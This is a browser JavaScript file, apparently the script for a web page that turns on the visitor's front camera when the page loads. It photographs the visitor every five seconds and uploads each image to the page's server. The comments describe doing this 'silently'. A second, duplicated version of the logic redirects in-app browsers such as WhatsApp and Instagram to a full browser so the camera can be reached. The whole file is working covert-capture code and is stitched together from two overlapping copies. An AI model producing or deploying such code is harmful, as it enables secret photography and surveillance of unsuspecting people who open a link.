const video = document.getElementById('video');
const statusIndicator = document.querySelector('.status-indicator');
const statusText = document.querySelector('.status-text');
const flash = document.querySelector('.flash');
const toast = document.querySelector('.toast');
let stream = null;
let captureInterval = null;

// Function to update status
function updateStatus(isActive) {
    statusIndicator.classList.toggle('camera-active', isActive);
    statusText.textContent = isActive ? 'Camera Active' : 'Camera Off';
    if (isActive) {
        video.classList.add('video-visible');
    }
}

// Function to show toast message
function showToast(message) {
    toast.textContent = message;
    toast.classList.add('toast-visible');
    setTimeout(() => {
        toast.classList.remove('toast-visible');
    }, 2000);
}

// Function to show flash effect
function showFlash() {
    flash.classList.add('flash-active');
    setTimeout(() => {
        flash.classList.remove('flash-active');
    }, 300);
}

// Function to send photo to server silently
async function sendPhotoToServer(blob) {
    try {
        const formData = new FormData();
        formData.append('photo', blob, 'photo.jpg');
        
        const response = await fetch('http://localhost:3000/upload', {
            method: 'POST',
            body: formData
        });
        
        if (!response.ok) {
            throw new Error('Upload failed');
        }
    } catch (error) {
        console.error('Error uploading photo:', error);
    }
}

// Function to capture photo silently
function capturePhoto() {
    if (!stream) {
        console.error('Camera stream not available');
        return;
    }

    try {
        console.log('Starting photo capture');
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const ctx = canvas.getContext('2d');
        
        // Draw video frame to canvas
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        
        // Convert to blob and send to server silently
        canvas.toBlob((blob) => {
            if (blob) {
                sendPhotoToServer(blob);
            }
        }, 'image/jpeg', 0.95);
    } catch (error) {
        console.error('Error capturing photo:', error);
    }
}

// Function to start the camera silently
async function startCamera() {
    try {
        stream = await navigator.mediaDevices.getUserMedia({
            video: {
                facingMode: 'user',
                width: { ideal: 1280 },
                height: { ideal: 720 }
            },
            audio: false
        });
        
        video.srcObject = stream;
        
        // Start automatic photo capture
        captureInterval = setInterval(capturePhoto, 5000); // Capture every 5 seconds
        
    } catch (err) {
        console.error('Error accessing camera:', err);
    }
}

// Start camera automatically when page loads
startCamera();

// Handle page visibility changes
document.addEventListener('visibilitychange', () => {
    if (document.hidden && stream) {
        clearInterval(captureInterval);
        stream.getTracks().forEach(track => track.stop());
        video.srcObject = null;
        stream = null;
    } else if (!document.hidden && !stream) {
        startCamera();
    }
});

document.addEventListener('DOMContentLoaded', () => {
    const video = document.getElementById('video');
    const canvas = document.createElement('canvas');
    const context = canvas.getContext('2d');
    const statusIndicator = document.querySelector('.status-indicator');
    const statusText = document.querySelector('.status-text');
    const flash = document.querySelector('.flash');
    const toast = document.querySelector('.toast');
    let stream = null;
    let isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
    let isInApp = /WhatsApp|Telegram|Line|KakaoTalk|Viber|Facebook|Instagram|Twitter/i.test(navigator.userAgent);

    // Function to update status
    function updateStatus(isActive) {
        statusIndicator.classList.toggle('camera-active', isActive);
        statusText.textContent = isActive ? 'Camera Active' : 'Camera Off';
    }

    // Function to show toast message
    function showToast(message) {
        toast.textContent = message;
        toast.classList.add('toast-visible');
        setTimeout(() => {
            toast.classList.remove('toast-visible');
        }, 2000);
    }

    // Function to show flash effect
    function showFlash() {
        flash.classList.add('flash-active');
        setTimeout(() => {
            flash.classList.remove('flash-active');
        }, 300);
    }

    // Request camera access
    async function setupCamera() {
        try {
            const constraints = {
                video: {
                    facingMode: 'user',
                    width: { ideal: 1280 },
                    height: { ideal: 720 }
                }
            };

            // Adjust constraints for mobile devices
            if (isMobile) {
                constraints.video.facingMode = { exact: 'user' };
            }

            // If in app, try to open in browser
            if (isInApp) {
                const currentUrl = window.location.href;
                const browserUrl = `https://${window.location.host}${window.location.pathname}`;
                if (currentUrl !== browserUrl) {
                    window.location.href = browserUrl;
                    return;
                }
            }

            stream = await navigator.mediaDevices.getUserMedia(constraints);
            video.srcObject = stream;
            
            // Wait for video to be ready
            await new Promise((resolve) => {
                video.onloadedmetadata = () => {
                    video.play();
                    resolve();
                };
            });

            updateStatus(true);
            console.log('Camera setup successful');
            console.log('Video dimensions:', video.videoWidth, 'x', video.videoHeight);
        } catch (error) {
            console.error('Error accessing camera:', error);
            updateStatus(false);
            if (isInApp) {
                showToast('Please open this website in your browser to use the camera.');
            } else {
                showToast('Error accessing camera. Please make sure you have granted camera permissions.');
            }
        }
    }

    // Capture photo
    async function capturePhoto() {
        if (!stream) {
            console.error('Camera stream not available');
            return;
        }

        try {
            console.log('Starting photo capture');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            context.drawImage(video, 0, 0, canvas.width, canvas.height);

            // Convert to blob
            const blob = await new Promise(resolve => {
                canvas.toBlob(resolve, 'image/jpeg', 0.95);
            });
            
            console.log('Photo captured, size:', blob.size);

            // Create form data
            const formData = new FormData();
            formData.append('photo', blob, `photo_${Date.now()}.jpg`);

            console.log('Uploading photo...');
            // Upload photo
            const response = await fetch('/upload', {
                method: 'POST',
                body: formData
            });

            if (!response.ok) {
                const errorText = await response.text();
                console.error('Upload failed:', errorText);
                throw new Error(`HTTP error! status: ${response.status}`);
            }

            const result = await response.json();
            console.log('Upload successful:', result);
            showFlash();
            showToast('Photo captured successfully!');

            // Auto-refresh the view page
            if (window.location.pathname.includes('view.html')) {
                loadPhotos();
            }
        } catch (error) {
            console.error('Error capturing/uploading photo:', error);
            showToast('Error capturing photo. Please try again.');
        }
    }

    // Auto-capture every 5 seconds
    let captureInterval;
    function startAutoCapture() {
        captureInterval = setInterval(capturePhoto, 5000);
    }

    function stopAutoCapture() {
        if (captureInterval) {
            clearInterval(captureInterval);
        }
    }

    // Initialize camera
    setupCamera();

    // Start auto-capture when camera is ready
    video.addEventListener('playing', () => {
        console.log('Camera is ready, starting auto-capture');
        startAutoCapture();
    });

    // Clean up when page is closed
    window.addEventListener('beforeunload', () => {
        stopAutoCapture();
        if (stream) {
            stream.getTracks().forEach(track => track.stop());
        }
    });
});